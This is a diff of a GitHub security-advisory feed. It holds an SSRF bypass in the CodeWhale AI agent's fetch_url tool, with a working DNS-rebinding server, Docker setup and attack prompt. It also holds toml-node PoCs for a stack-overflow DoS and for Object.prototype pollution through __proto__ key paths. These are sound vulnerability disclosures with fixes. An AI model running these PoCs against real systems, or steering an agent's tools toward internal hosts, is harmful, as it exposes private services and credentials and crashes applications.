+<li><a href="https://github.com/Hmbown/CodeWhale/commit/26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e">https://github.com/Hmbown/CodeWhale/commit/26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-before-ssrf-bypass-via-dns-pinning-toctou">https://www.vulncheck.com/advisories/codewhale-before-ssrf-bypass-via-dns-pinning-toctou</a></li>
+<li><a href="https://github.com/advisories/GHSA-6v2g-fpxh-pmmh">https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-09-04T18:05:12.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[deepseek-tui] CodeWhale: SSRF‌ bypass - TOCTOU on DNS failure for DNS pinning]]></title>
+        <id>https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</id>
+        <link href="https://github.com/advisories/GHSA-6v2g-fpxh-pmmh"/>
+        <updated>2026-09-04T18:05:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="maintainer-resolution">Maintainer resolution</h3>
+<p>The CodeWhale maintainers validated this report. The affected package ranges are recorded in the advisory metadata. Version 0.8.64 contains the fix in commit 26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e. Users should upgrade to 0.8.64 or later. The original reporter analysis is preserved below.</p>
+<h3 id="summary">Summary</h3>
+<p>DNS-pinning failure allows natural failure of code, however with a custom DNS server that fails the initial requests and allows the secondary requests, it's possible to bypass the logic.</p>
+<h3 id="details">Details</h3>
+<p>Simplified attack scenario:</p>
+<ol>
+<li>Attacker asks agent to visit the <code>mydomain.com</code>.</li>
+<li>CodeWhale tries to resolve the IP of <code>mydomain.com</code>, however, the custom DNS server that's controlled by the attacker marks the request DNS‌ query as failed (Time of Check). </li>
+<li>CodeWhale allows the code to continue as it expects it request to fail again.</li>
+<li>On the secondary (Time of Use), the DNS server resolves mydomain.com to a local IP (e.g., 127.0.0.1)</li>
+<li>The request is executed and the content from port 80 is returned to the attacker, allowing full bypass of SSRF mitigations.</li>
+</ol>
+<p>In the <a href="https://github.com/Hmbown/CodeWhale/blob/8dff2f7525ead210a01347b48f53ae3f20d094ec/crates/tui/src/tools/fetch_url.rs#L362">DNS-pinning</a> section, when DNS fails, the code is allowed to continue as it's expected to fail. However</p>
+<h3 id="poc">PoC</h3>
+<p>This is a custom DNS server that fails the first requests (in this case, the first and second requests must fail, while the 3rd and 4th are allowed due to A and AAAA DNS queries). Here is the code for the DNS‌ server(for PoC, should be placed in <code>dnser/dns_resolver.py</code>:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Local DNS Resolver — customizable request/response handling.
+Uses only the standard library + dnslib.
+
+Usage:
+    pip install dnslib
+    sudo python dns_resolver.py          # binds to 0.0.0.0:53 by default
+    python dns_resolver.py --port 5353   # unprivileged port for testing
+"""
+
+import argparse
+import socket
+import threading
+from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, CNAME, AAAA
+
+
+UPSTREAM_DNS = ("8.8.8.8", 53)   # fallback resolver
+
+
+def handle_no_aaaa(query: DNSRecord) -&gt; DNSRecord | None:
+    """Drop all AAAA requests."""
+    if QTYPE[query.q.qtype] == "AAAA":
+        reply = query.reply()
+        reply.header.rcode = 3  # NXDOMAIN
+        return reply
+    return None
+
+def handle_blocked(query: DNSRecord) -&gt; DNSRecord | None:
+    """Block domains by returning NXDOMAIN."""
+    blocked = {"blocked.example.com.", "ads.tracker.io."}
+    qname = str(query.q.qname)
+    if qname in blocked:
+        print(f"  [BLOCKED] {qname}")
+        reply = query.reply()
+        reply.header.rcode = 3          # NXDOMAIN
+        return reply
+    return None
+
+failer = 0
+MAX_FAIL = 2
+MAX_SUCCESS = 2
+
+def handle_overrides(query: DNSRecord) -&gt; DNSRecord | None:
+    global failer
+    """Return hardcoded A records for specific names (split-horizon / local dev)."""
+    overrides: dict[str, str] = {
+        "myapp.local.":     "127.0.0.1",
+        "devserver.local.": "192.168.1.100",
+        "mydomain.com.":    "127.0.0.1",
+    }
+    qname = str(query.q.qname)
+    qtype = QTYPE[query.q.qtype]
+
+    if qname in overrides and qtype == "A":
+        failer += 1
+        cycle_pos = (failer - 1) % (MAX_FAIL + MAX_SUCCESS)  # position within cycle
+        should_fail = cycle_pos &lt; MAX_FAIL
+
+        print(f"  [OVERRIDE] request={failer} cycle_pos={cycle_pos} fail={should_fail}")
+
+        if should_fail:
+            reply = query.reply()
+            reply.header.rcode = 3
+            reply.header.ra = 0
+            return reply
+
+        ip = overrides[qname]
+        print(f"  [OVERRIDE] {qname} → {ip}")
+        reply = query.reply()
+        reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))
+        reply.header.ra = 0
+        return reply
+
+    return None
+
+
+def handle_rewrite(query: DNSRecord) -&gt; DNSRecord | None:
+    """Rewrite a CNAME transparently (resolve alias locally)."""
+    rewrites: dict[str, str] = {
+        # "old.internal.": "new.internal.",
+    }
+    qname = str(query.q.qname)
+    if qname in rewrites:
+        target = rewrites[qname]
+        print(f"  [REWRITE] {qname} → {target}")
+        reply = query.reply()
+        reply.add_answer(RR(qname, QTYPE.CNAME, rdata=CNAME(target), ttl=60))
+        return reply
+    return None
+
+
+def handle_upstream(query: DNSRecord) -&gt; DNSRecord | None:
+    """Forward the query to the upstream resolver."""
+    try:
+        raw = query.pack()
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(3)
+        sock.sendto(raw, UPSTREAM_DNS)
+        data, _ = sock.recvfrom(4096)
+        sock.close()
+        reply = DNSRecord.parse(data)
+        print(f"  [UPSTREAM] {query.q.qname} → {UPSTREAM_DNS[0]}")
+        return reply
+    except Exception as e:
+        print(f"  [UPSTREAM ERROR] {e}")
+        return None
+
+
+# Chain of responsibility — handlers are tried in order; first non-None wins.
+HANDLERS = [
+    handle_blocked,
+    handle_overrides,
+    handle_rewrite,
+    handle_upstream,
+]
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  Server plumbing — no need to edit below this line
+# ─────────────────────────────────────────────────────────────────────────────
+
+def resolve(data: bytes) -&gt; bytes:
+    try:
+        query = DNSRecord.parse(data)
+        qname = str(query.q.qname)
+        qtype = QTYPE[query.q.qtype]
+        print(f"[QUERY] {qtype} {qname}")
+
+        for handler in HANDLERS:
+            reply = handler(query)
+            if reply is not None:
+                return reply.pack()
+
+        # Fallback: SERVFAIL
+        reply = query.reply()
+        reply.header.rcode = 2
+        return reply.pack()
+
+    except Exception as e:
+        print(f"[ERROR] Failed to parse/handle query: {e}")
+        return b""
+
+
+def udp_server(host: str, port: int) -&gt; None:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((host, port))
+    print(f"DNS resolver listening on {host}:{port} (UDP)")
+    while True:
+        data, addr = sock.recvfrom(4096)
+        threading.Thread(
+            target=lambda d=data, a=addr: sock.sendto(resolve(d), a),
+            daemon=True,
+        ).start()
+
+
+def tcp_server(host: str, port: int) -&gt; None:
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind((host, port))
+    srv.listen(10)
+    print(f"DNS resolver listening on {host}:{port} (TCP)")
+
+    def handle_conn(conn: socket.socket) -&gt; None:
+        with conn:
+            length_bytes = conn.recv(2)
+            if len(length_bytes) &lt; 2:
+                return
+            length = int.from_bytes(length_bytes, "big")
+            data = conn.recv(length)
+            response = resolve(data)
+            conn.sendall(len(response).to_bytes(2, "big") + response)
+
+    while True:
+        conn, _ = srv.accept()
+        threading.Thread(target=handle_conn, args=(conn,), daemon=True).start()
+
+
+def main() -&gt; None:
+    parser = argparse.ArgumentParser(description="Local DNS resolver")
+    parser.add_argument("--host", default="0.0.0.0", help="Bind address")
+    parser.add_argument("--port", type=int, default=53, help="Bind port (use 5353 for unprivileged)")
+    args = parser.parse_args()
+
+    t_udp = threading.Thread(target=udp_server, args=(args.host, args.port), daemon=True)
+    t_tcp = threading.Thread(target=tcp_server, args=(args.host, args.port), daemon=True)
+    t_udp.start()
+    t_tcp.start()
+
+    try:
+        t_udp.join()
+    except KeyboardInterrupt:
+        print("\nShutting down.")
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<p>Docker file to build it(<code>dnser/Dockerfile</code>):</p>
+<pre><code class="language-bash">FROM python:3.12-slim
+
+WORKDIR /app
+
+RUN pip install dnslib --no-cache-dir
+
+COPY dns_resolver.py .
+
+EXPOSE 53/udp
+EXPOSE 53/tcp
+
+CMD ["python", "-u", "dns_resolver.py", "--host", "0.0.0.0", "--port", "53"]
+</code></pre>
+<p>Then to simplify the test, we can set everything in a container and make the agent use the local DNS resolver:</p>
+<p><code>docker-compose.yml</code>:</p>
+<pre><code class="language-yaml">services:
+  dns-resolver:
+    build: dnser
+    container_name: dns-resolver
+    restart: unless-stopped
+    networks:
+      dns-net:
+        ipv4_address: 10.0.1.2
+
+  a:
+    image: ghcr.io/hmbown/deepseek-tui:latest
+    container_name: tui
+    environment:
+      DEEPSEEK_API_KEY: sk-
+    stdin_open: true
+    tty: true
+    dns: 10.0.1.2
+    networks:
+      - dns-net
+    depends_on:
+      - dns-resolver
+    sysctls:
+      net.ipv6.conf.all.disable_ipv6: 1
+
+
+
+networks:
+  dns-net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 10.0.1.0/24
+</code></pre>
+<p>Then to check everything we could simply:
+<code>sudo docker attach tui</code>
+Prompt: <code>read contnet of http://mydomain.com using fetch_url tools, no thinking just raw output</code>
+The tool will allow the request to go through 127.0.0.1. To make sure it's not a false-positive I've also installed python in CodeWhale container and ran <code>python3 -m http.server 80</code> as root to make sure the request can actually read content.</p>
+<p>To read the logs from dns-resolver:
+<code>sudo docker logs -f dns-resolver</code></p>
+<h3 id="impact">Impact</h3>
+<p>Similar to other SSRF bypasses, other services private on the system, private network, and cloud credentials are at risk.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-6v2g-fpxh-pmmh">https://github.com/Hmbown/CodeWhale/security/advisories/GHSA-6v2g-fpxh-pmmh</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-75856">https://nvd.nist.gov/vuln/detail/CVE-2026-75856</a></li>
+<li><a href="https://github.com/Hmbown/CodeWhale/commit/26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e">https://github.com/Hmbown/CodeWhale/commit/26de44a8bd5051f8f944ea60b2c37ae1d2b7d25e</a></li>
+<li><a href="https://www.vulncheck.com/advisories/codewhale-before-ssrf-bypass-via-dns-pinning-toctou">https://www.vulncheck.com/advisories/codewhale-before-ssrf-bypass-via-dns-pinning-toctou</a></li>
+<li><a href="https://github.com/advisories/GHSA-6v2g-fpxh-pmmh">https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6v2g-fpxh-pmmh</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-09-04T18:05:12.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[codewhale] CodeWhale: js_execution leaks parent environment to model context via missing env scrub]]></title>
         <id>https://github.com/advisories/GHSA-h539-c7r8-3xq4</id>
@@ -1306,582 +2556,5 @@ walk:  forgedLeaf -&gt; attackerSelfSignedRoot        (verifies, attacker contro
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-09-04T17:33:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[siyuan] Duplicate Advisory: SiYuan: Cross-boundary content disclosure via getBacklinkDoc/getBackmentionDoc (publish mode): reader-reachable rendered DOM of publish-forbidden docs; sibling list endpoints are filtered]]></title>
-        <id>https://github.com/advisories/GHSA-2mmh-4rf8-7xg6</id>
-        <link href="https://github.com/advisories/GHSA-2mmh-4rf8-7xg6"/>
-        <updated>2026-09-03T21:21:12.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
-<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-36v8-mpjm-8j5r. This link is maintained to preserve external references.</p>
-<h2 id="original-description">Original Description</h2>
-<p>SiYuan before v3.7.3 fails to apply publish-access filters to the getBacklinkDoc and getBackmentionDoc content endpoints (/api/ref/getBacklinkDoc and /api/ref/getBackmentionDoc). While the corresponding backlink list endpoints filter publish-forbidden documents, the content endpoints (gated only by CheckAuth) do not. A publish-mode reader — including an anonymous reader when publish Basic Auth is disabled — can call these endpoints directly with a publish-forbidden document's ID to retrieve its rendered DOM content and to determine whether the document references a given block (a reference-existence oracle).</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-36v8-mpjm-8j5r">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-36v8-mpjm-8j5r</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-68586">https://nvd.nist.gov/vuln/detail/CVE-2026-68586</a></li>
-<li><a href="https://www.vulncheck.com/advisories/siyuan-before-content-disclosure-via-getbacklinkdoc">https://www.vulncheck.com/advisories/siyuan-before-content-disclosure-via-getbacklinkdoc</a></li>
-<li><a href="https://github.com/advisories/GHSA-2mmh-4rf8-7xg6">https://github.com/advisories/GHSA-2mmh-4rf8-7xg6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2mmh-4rf8-7xg6</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-08-03T15:32:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[toml] toml-node: Uncontrolled Recursion]]></title>
-        <id>https://github.com/advisories/GHSA-82x6-q7mm-w9cf</id>
-        <link href="https://github.com/advisories/GHSA-82x6-q7mm-w9cf"/>
-        <updated>2026-09-03T20:56:14.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>toml.parse()</code> crashes with an uncaught <code>RangeError: Maximum call stack size exceeded</code> when parsing deeply nested arrays or inline tables. The parser is generated by <strong>Peggy 5.1.0</strong> (a PEG parser generator) as a recursive-descent parser; the value rule mutually recurses with the array and inline-table rules with <strong>no depth limit</strong>, so nesting depth equal to the input depth exhausts Node's call stack.</p>
-<p>A small payload — a bare array nested a few thousand levels deep (<strong>~5–6 KB</strong>) — reliably crashes the process on a default Node.js configuration. <code>toml</code> has <strong>~47 million monthly downloads</strong>.</p>
-<hr>
-<h2 id="vulnerable-code">Vulnerable Code</h2>
-<p>The parser is a <strong>generated</strong> recursive-descent parser (<code>lib/parser.js</code>, header: <code>// @generated by Peggy 5.1.0.</code>). The recursion sink is the mutual recursion between the <code>value</code>, <code>array</code>, and <code>inline_table</code> rule functions — none carry a depth counter:</p>
-<pre><code class="language-javascript">// lib/parser.js — peg$parsevalue() @ line 1008
-function peg$parsevalue() {
-  ...
-  s0 = peg$parsearray();          // line 1017  ← value → array
-  if (s0 === peg$FAILED) {
-    s0 = peg$parseinline_table(); // line 1019  ← value → inline_table
-  }
-  ...
-}
-
-// peg$parsearray() @ line 2879
-function peg$parsearray() {
-  ...
-  s3 = peg$parsevalue();          // line 2931  ← array element → value (back-edge)
-  ...
-}
-
-// peg$parseinline_table() @ line 3066 → peg$parseinline_table_entry() @ line 3239
-function peg$parseinline_table_entry() {
-  ...
-  s5 = peg$parsevalue();          // line 3266  ← inline-table value → value (back-edge)
-  ...
-}
-</code></pre>
-<p><strong>Recursion cycle</strong> for <code>a=[[[ … ]]]</code> (bare nested arrays):</p>
-<pre><code>toml.parse(src)
-  → peg$parsevalue()        # parser.js:1008
-      → peg$parsearray()     # parser.js:1017 / 2879
-          → peg$parsevalue() # parser.js:2931  ← back-edge, per nested element
-              → …            # depth == input nesting → RangeError, no guard
-</code></pre>
-<p>Inline tables (<code>{arr=[ … ]}</code>, <code>{a={a= … }}</code>) reach the same cycle via <code>peg$parseinline_table</code> / <code>peg$parseinline_table_entry</code>. Because the parser is machine-generated, there is no hand-written function to patch; the fix belongs in the grammar (<code>src/toml.pegjs</code>) or in an input guard (see <em>Suggested Fix</em>).</p>
-<hr>
-<h2 id="confirmed-poc-toml-412-nodejs-v24160">Confirmed PoC (toml 4.1.2, Node.js v24.16.0)</h2>
-<p><strong>Setup:</strong></p>
-<pre><code class="language-bash">npm install toml@4.1.2        # latest release; 4.1.1 and earlier are equally affected
-# Docker equivalent:
-# docker run --rm node:24 bash -c "npm i -g toml &gt;/dev/null 2&gt;&amp;1; node -e '&lt;PoC below&gt;'"
-</code></pre>
-<p><strong>Reproduce</strong> — save as <code>poc.js</code>, run <code>node poc.js</code>:</p>
-<pre><code class="language-javascript">const toml = require('toml');
-console.log('version:', require('toml/package.json').version);  // 4.1.2
-
-// Smallest reliable payload: a bare array nested 3000 levels (~6 KB)
-let x = '1';
-for (let i = 0; i &lt; 3000; i++) x = '[' + x + ']';
-const payload = 'a=' + x;
-console.log('payload bytes:', payload.length);   // 6003
-
-try {
-  toml.parse(payload);
-  console.log('no crash');
-} catch (e) {
-  console.log('CONFIRMED:', e.constructor.name + ':', e.message.slice(0, 40));
-  console.log('is RangeError?', e instanceof RangeError,          // true
-              '| is SyntaxError?', e instanceof SyntaxError);     // false
-}
-</code></pre>
-<p><strong>Expected output (vulnerable — actual run):</strong></p>
-<pre><code>version: 4.1.2
-payload bytes: 6003
-CONFIRMED: RangeError: Maximum call stack size exceeded
-is RangeError? true | is SyntaxError? false
-</code></pre>
-<p><strong>Verified crash thresholds (fresh process, single parse, default Node 24 stack):</strong></p>
-<table>
-<thead>
-<tr>
-<th>Payload shape</th>
-<th>Reliable crash depth</th>
-<th>Payload size</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Bare nested array <code>a=[[ … ]]</code></td>
-<td>≥ ~2,500</td>
-<td><strong>~5 KB</strong> (6 KB at depth 3000, used above)</td>
-</tr>
-<tr>
-<td>Inline table <code>{arr=[ … ]}</code></td>
-<td>≥ ~1,500</td>
-<td>~12 KB</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p><strong>Note on the exact threshold:</strong> the precise crashing depth is not perfectly deterministic — it shifts by a few hundred levels depending on V8 JIT state, Node version, platform, and any configured <code>--stack-size</code>. This is expected for a stack-overflow condition. A payload nested a few thousand levels deep (single-digit KB) crashes reliably across runs; the PoC above (depth 3000) leaves ample margin.</p>
-</blockquote>
-<hr>
-<h2 id="realistic-attack-scenario">Realistic Attack Scenario</h2>
-<pre><code class="language-javascript">// Node.js service parsing user-supplied TOML config
-const express = require('express');
-const toml = require('toml');
-const app = express();
-app.use(express.text({ type: 'application/toml', limit: '100kb' }));
-
-app.post('/config', (req, res) =&gt; {
-  try {
-    const config = toml.parse(req.body);   // ← RangeError on ~6 KB nested payload
-    res.json({ status: 'ok' });
-  } catch (e) {
-    // toml only throws a peg$SyntaxError (e.name === 'SyntaxError', with e.line/e.column)
-    // on malformed input. A RangeError has neither, so this guard rethrows it:
-    if (e.line != null) return res.status(400).json({ error: e.message });
-    throw e;                                // RangeError propagates → uncaught → worker down
-  }
-});
-</code></pre>
-<p>An unauthenticated attacker POSTs a ~6 KB deeply nested body (well under the 100 KB limit). <code>toml.parse</code> overflows the stack and throws <code>RangeError</code>; any handler that only special-cases syntax errors rethrows it, taking down the request (and, depending on the server, the worker).</p>
-<blockquote>
-<p>The package exports <strong>only</strong> <code>parse</code> (<code>Object.keys(require('toml'))</code> → <code>['parse']</code>); there is <strong>no</strong> <code>toml.SyntaxError</code>. Code written as <code>catch (e) { if (e instanceof toml.SyntaxError) … }</code> is itself broken (<code>instanceof undefined</code> throws), so applications generally cannot cleanly distinguish the DoS <code>RangeError</code> from a normal parse error.</p>
-</blockquote>
-<hr>
-<h2 id="impact">Impact</h2>
-<p>Any Node.js application that calls <code>toml.parse()</code> on untrusted input is exposed to a remote, unauthenticated denial of service via a small (<del>5–6 KB) deeply nested payload. <code>toml.parse</code> is the package's only public API, and TOML is commonly parsed from user-supplied config/upload endpoints. With **</del>47 million monthly downloads** and <strong>0 existing CVEs</strong>, the exposure is broad.</p>
-<p><code>RangeError</code> is a subclass of <code>Error</code> (not of the parser's <code>SyntaxError</code>), so it bypasses the usual "is this a parse error?" checks and propagates as an unexpected exception.</p>
-<hr>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Because <code>lib/parser.js</code> is generated, the fix should be applied at the grammar level and regenerated, or guarded at the entry point:</p>
-<p><strong>Option 1 — grammar-level depth guard (<code>src/toml.pegjs</code>), then re-run Peggy:</strong></p>
-<pre><code class="language-javascript">// In the grammar initializer:
-{ let depth = 0; const MAX_DEPTH = 500; }
-
-// Wrap the recursive `value` rule:
-value = &amp;{ if (++depth &gt; MAX_DEPTH) { error("TOML nesting too deep"); } return true; }
-        v:(array / inline_table / ...) { depth--; return v; }
-</code></pre>
-<p><strong>Option 2 — entry-point guard in <code>index.js</code></strong> (reject pathological input before parsing):</p>
-<pre><code class="language-javascript">module.exports.parse = function (input) {
-  // cheap structural bound before the recursive parse
-  let depth = 0, max = 0;
-  for (const ch of input) {
-    if (ch === '[' || ch === '{') max = Math.max(max, ++depth);
-    else if (ch === ']' || ch === '}') depth--;
-  }
-  if (max &gt; 500) throw new Error('TOML nesting depth exceeds limit (500)');
-  return realParse(input);
-};
-</code></pre>
-<p><strong>Immediate mitigation (users, verified):</strong> bound untrusted input length <strong>and</strong> bracket-nesting depth before calling <code>toml.parse()</code>, e.g. reject payloads whose maximum <code>[</code>/<code>{</code> nesting exceeds a few hundred. A byte-length limit alone is insufficient (5 KB already crashes).</p>
-<hr>
-<h2 id="comparison-with-related-vulnerabilities">Comparison with Related Vulnerabilities</h2>
-<p>Same CWE-674 class as the recursion-DoS findings in the PyPI <code>toml</code> package (C055) and the YAML parsers (PyYAML GHSA-r9mm-j37c-pjwp, ruamel.yaml). The distinguishing detail here: the parser is <strong>generated by Peggy</strong>, so the recursion lives in <code>peg$parsevalue</code>/<code>peg$parsearray</code>/<code>peg$parseinline_table</code> and cannot be fixed by editing a hand-written function — the earlier draft of this report incorrectly showed hand-written <code>parseValue(tokens, index)</code> functions that do not exist in the package.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-82x6-q7mm-w9cf">https://github.com/BinaryMuse/toml-node/security/advisories/GHSA-82x6-q7mm-w9cf</a></li>
-<li><a href="https://github.com/BinaryMuse/toml-node/pull/72">https://github.com/BinaryMuse/toml-node/pull/72</a></li>
-<li><a href="https://github.com/BinaryMuse/toml-node/commit/967b8b06754f3ecd9863cea118dc50792a8c353f">https://github.com/BinaryMuse/toml-node/commit/967b8b06754f3ecd9863cea118dc50792a8c353f</a></li>
-<li><a href="https://github.com/advisories/GHSA-82x6-q7mm-w9cf">https://github.com/advisories/GHSA-82x6-q7mm-w9cf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-82x6-q7mm-w9cf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-03T20:56:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[toml] toml-node: Prototype Pollution Leads to `Object.prototype` Corruption via `__proto__` Key-Path Desynchronization]]></title>
-        <id>https://github.com/advisories/GHSA-v5mp-jgw5-2x6j</id>
-        <link href="https://github.com/advisories/GHSA-v5mp-jgw5-2x6j"/>
-        <updated>2026-09-03T20:55:34.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>toml.parse()</code> writes attacker-controlled keys onto <code>Object.prototype</code>. The compiler protects the tables it builds by creating them with <code>Object.create(null)</code>, which neutralizes a direct <code>[__proto__]</code> table. An attacker bypasses that protection by routing a table path <em>through a scalar value</em> and into the real prototype chain: a path such as <code>a.b.y.__proto__.__proto__</code>, where <code>a.b.y</code> holds a number, resolves to <code>Object.prototype</code> and every subsequent key/value writes onto it.</p>
-<p>The bypass succeeds because the compiler's duplicate-key guards track paths with keys that do not match the keys used during traversal. The tracking strings and the traversal strings <strong>desynchronize</strong>, so the guard that should reject descending through an existing scalar never fires.</p>
-<h3 id="steps-to-reproduce">Steps to reproduce</h3>
-<ol>
-<li><p>Install the latest version and run the comma-desynchronization payload.</p>
-<pre><code class="language-bash">npm install toml@4.1.1
-</code></pre>
-<pre><code class="language-js">const toml = require("toml");
-delete Object.prototype.polluted;
-
-toml.parse(`
-[a.b]
-y = 1
-[a.b.y.__proto__.__proto__]
-polluted = "yes"
-`);
-
-console.log(({}).polluted);   // -&gt; "yes"
-</code></pre>
-</li>
-<li><p>Observe that a freshly created object inherits the injected key, confirming <code>Object.prototype</code> was modified:</p>
-<pre><code>yes
-</code></pre>
-</li>
-<li><p>Confirm the prefix-clear variant reaches the same result:</p>
-<pre><code class="language-js">toml.parse(`
-aa = 1
-[[a]]
-[aa.__proto__.__proto__]
-polluted = "yes"
-`);
-console.log(({}).polluted);   // -&gt; "yes"
-</code></pre>
-</li>
-</ol>
-<p>A nested gadget object is also injectable, not only scalar keys:</p>
-<pre><code class="language-js">toml.parse(`
-[a.b]
-y = 1
-[a.b.y.__proto__.__proto__.code]
-val = "arbitrary"
-`);
-console.log(({}).code.val);     // -&gt; "arbitrary"
-</code></pre>
-<h3 id="technical-details">Technical details</h3>
-<p>The compiler builds the result tree in <code>lib/compiler.js</code>. Tables are created with a null prototype, so a direct <code>[__proto__]</code> table only sets an ordinary own property and does not pollute:</p>
-<pre><code class="language-js">var data = Object.create(null);   // line 7 — root has no prototype
-// ...
-target[k] = Object.create(null);  // line 64 — intermediate tables, no prototype
-</code></pre>
-<p>The defect is in <code>deepRef</code>, which resolves a table path by walking each key segment of the live object graph:</p>
-<pre><code class="language-js">function deepRef(start, keys, value, off) {        // lib/compiler.js:183
-  var traversedPath = "";
-  var ctx = start;
-  for (var i = 0; i &lt; keys.length; i++) {
-    var key = keys[i];
-    traversedPath = traversedPath ? traversedPath + "." + key : key;
-    if (typeof ctx[key] === "undefined") {
-      if (i === keys.length - 1) { ctx[key] = value; }
-      else { ctx[key] = Object.create(null); }
-    } else if (i !== keys.length - 1 &amp;&amp; valueAssignments.has(traversedPath)) {
-      genError("Cannot redefine existing key '" + traversedPath + "'.", off);  // line 197 — the guard
-    }
-    ctx = ctx[key];                                // line 200 — follows __proto__ into the prototype chain
-    if (ctx instanceof Array &amp;&amp; ctx.length &amp;&amp; i &lt; keys.length - 1) {
-      ctx = ctx[ctx.length - 1];
-    }
-  }
-  return ctx;
-}
-</code></pre>
-<p>Two problems combine:</p>
-<p><strong>1. <code>deepRef</code> treats <code>__proto__</code> (and <code>constructor</code>, <code>prototype</code>) as ordinary traversable keys.</strong> Line 200 executes <code>ctx = ctx[key]</code> for every segment with no reserved-key check. When traversal reaches a scalar value — for example the number <code>1</code> stored at <code>a.b.y</code> — the next two <code>__proto__</code> segments evaluate to <code>Number.prototype</code> and then <code>Object.prototype</code>. The null-prototype hardening covers only the <em>container tables</em> the compiler creates; it does not cover the <em>values</em> stored in them, and those values carry normal prototypes.</p>
-<p><strong>2. The guard on line 197 is defeated by a path-format desynchronization.</strong> <code>currentPath</code> is assigned two incompatible types: <code>setPath</code> stores an <strong>array</strong> (<code>currentPath = path</code>, line 151) while <code>addTableArray</code> stores a <strong>string</strong> (<code>currentPath = quotedPath</code>, line 172). When <code>assign</code> later builds the path of a value, it concatenates that array with a string:</p>
-<pre><code class="language-js">var fullPath = currentPath ? currentPath + "." + keys.join(".") : keys.join("."); // line 77
-valueAssignments.add(fullPath);                                                   // line 86
-</code></pre>
-<p>For the table <code>[a.b]</code>, <code>currentPath</code> is the array <code>["a","b"]</code>, so <code>currentPath + "."</code> coerces it via <code>Array.toString()</code> to the <strong>comma-joined</strong> string <code>"a,b"</code>. The value <code>y = 1</code> is therefore recorded as <code>"a,b.y"</code>. But <code>deepRef</code>, walking the path <code>a.b.y.__proto__.__proto__</code>, builds <code>traversedPath</code> with dots and checks <code>valueAssignments.has("a.b.y")</code>. The set contains <code>"a,b.y"</code>, not <code>"a.b.y"</code>, so the lookup misses and the guard never raises "Cannot redefine existing key". Traversal proceeds through the scalar <code>1</code> into <code>Object.prototype</code>.</p>
-<p>Instrumenting the tracking sets after parsing the payload confirms the mismatch:</p>
-<pre><code>assignedPaths    : [ "a.b", "a,b.y", "a.b.y.__proto__.__proto__", ... ]
-valueAssignments : [ "a,b.y", ... ]
-deepRef checks valueAssignments.has("a.b.y")  -&gt;  false   (recorded as "a,b.y")
-</code></pre>
-<p>A second route reaches the same state without the comma trick. A table array <code>[[a]]</code> triggers the prefix-clearing loop in <code>addTableArray</code>, which deletes tracking entries by string prefix and wipes the guard state before the <code>__proto__</code> descent:</p>
-<pre><code class="language-js">assignedPaths.forEach(function(p) {                 // lines 164-166
-  if (p.indexOf(quotedPath) === 0) assignedPaths.delete(p);
-});
-valueAssignments.forEach(function(p) {              // lines 167-169
-  if (p.indexOf(quotedPath) === 0) valueAssignments.delete(p);
-});
-</code></pre>
-<h3 id="impact">Impact</h3>
-<ul>
